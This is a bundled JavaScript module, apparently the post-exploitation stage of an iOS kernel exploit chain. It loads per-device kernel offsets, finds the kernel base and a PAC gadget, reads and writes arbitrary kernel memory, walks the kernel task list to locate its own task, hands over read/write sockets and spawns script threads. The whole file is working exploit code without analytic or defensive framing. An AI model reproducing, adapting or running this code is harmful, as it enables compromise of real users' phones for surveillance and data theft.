__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ DriverPostExpl)
/* harmony export */ });
/* harmony import */ var _Offsets__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./Offsets */ "./src/libs/Driver/Offsets.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");




const TAG = "DRIVER-POSTEXPL"

class DriverPostExpl
{
	#offsets;
	#kernelBase;

	constructor() {
		this.#offsets = _Offsets__WEBPACK_IMPORTED_MODULE_0__["default"].getByDeviceAndVersion();
	}

	runPE() {
		console.log(TAG, `runPE()`);
		if (!this.#offsets) {
			console.log(TAG, `Offsets were not obtained, aborting`);
			return false;
		}
		/*
		let baseKernel = startSandworm();
		if (baseKernel == -1)
			return false;
		*/
		this.#kernelBase = mpd_kernel_base();

		return true;
	}

	getPaciaGadget() {
		return mpd_pacia_gadget();
	}

	getKernelBase() {
		return this.#kernelBase;
	}

	getSelfTaskAddr() {
		console.log(TAG, `getSelfTaskAddr`);

		let selfTaskKaddr = 0;
		for (let i=0; i<5; i++)
		{
			selfTaskKaddr = this.#findSelfTaskKaddr(true);
			if (!selfTaskKaddr)
			{
				console.log(TAG, `Searching the other way around`);
				selfTaskKaddr = this.#findSelfTaskKaddr(false);
			}
			else
				break;
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep",20000);
		}
		return selfTaskKaddr;
	}

	#findSelfTaskKaddr(direction) {
		let kernelTaskAddr = this.#kernelBase + this.#offsets.kernelTask;
		console.log(TAG, `baseKernel: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(this.#kernelBase)}, kernelTask: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(kernelTaskAddr)}`);

		let kernelTaskVal = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		this.read(kernelTaskAddr, kernelTaskVal, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
		kernelTaskVal = uread64(kernelTaskVal);
		//console.log(TAG,`kernelTaskval:${kernelTaskVal}`);
		kernelTaskVal = BigInt(kernelTaskVal);
		//console.log(TAG,`kernelTaskval:${Utils.hex(kernelTaskVal)}`);
		let ourPid = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("getpid");
		console.log(TAG, `Our pid:${ourPid}`);
		let nextTask = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n;
		if (direction)
			this.read(kernelTaskVal + this.#offsets.nextTask, nextTask, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
		else
			this.read(kernelTaskVal + this.#offsets.prevTask, nextTask, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
		nextTask = uread64(nextTask);
		//console.log(TAG,`nextTask:${Utils.hex(nextTask)}`);

		while (nextTask != 0 && nextTask != kernelTaskVal) {
			let procROAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			this.read(nextTask + this.#offsets.procRO, procROAddr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
			procROAddr = uread64(procROAddr);
			//console.log(TAG,`procROAddr:${Utils.hex(procROAddr)}`);
			let procVal = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			this.read(procROAddr, procVal, 8);
			procVal = BigInt(uread64(procVal));
			//console.log(TAG,`procVal:${Utils.hex(procVal)}`);
			if (procVal && this.strip(procVal) > 0xffffffd000000000n) {
				let pid = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
				this.read(procVal + this.#offsets.pid, pid, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
				let buffRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(pid, 4);
				let view = new DataView(buffRes);
				pid = view.getUint32(0,true);
				//console.log(TAG,`pid:${Utils.hex(pid)}`);
				if (pid == ourPid) {
					console.log(TAG, `Found our pid`);
					return nextTask;
				}
				let nextTaskLocation = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
				if (direction)
					this.read(nextTask + this.#offsets.nextTask, nextTaskLocation, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
				else
					this.read(nextTask + this.#offsets.prevTask, nextTaskLocation, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
				nextTask = uread64(nextTaskLocation);
			}
			else
				break;
		}
		return false;
	}

	read(srcAddr, dst, len) {
		srcAddr = this.strip(srcAddr);
		if (srcAddr < 0xffffffd000000000n) {
			console.log(TAG, `Invalid kaddr, cannot read: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(srcAddr)}`);
			return false;
		}
		kread_length(srcAddr,dst, len);
		return true;
	}

	write(dst, src, len) {
		let dstAddr = this.strip(dst);
		if (dstAddr < 0xffffffd000000000n) {
			console.log(TAG, `Invalid kaddr, cannot write:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(dstAddr)}`);
			return false;
		}
		kwrite_length(dst, src, len);
		return true;
	}

	writeZoneElement(dstAddr, src, len) {
		return kwrite_zone_element(dstAddr, src, len);
	}

	offsets() {
		return this.#offsets;
	}

	strip(val) {
		return xpac(val);
	}

	transferRW() {
		return {
			controlSocket: mpd_control_socket(),
			rwSocket: mpd_rw_socket()
		};
	}

	threadSpawn(scriptCFString, threadMem) {
		mpd_js_thread_spawn(scriptCFString, threadMem, true);
	}
}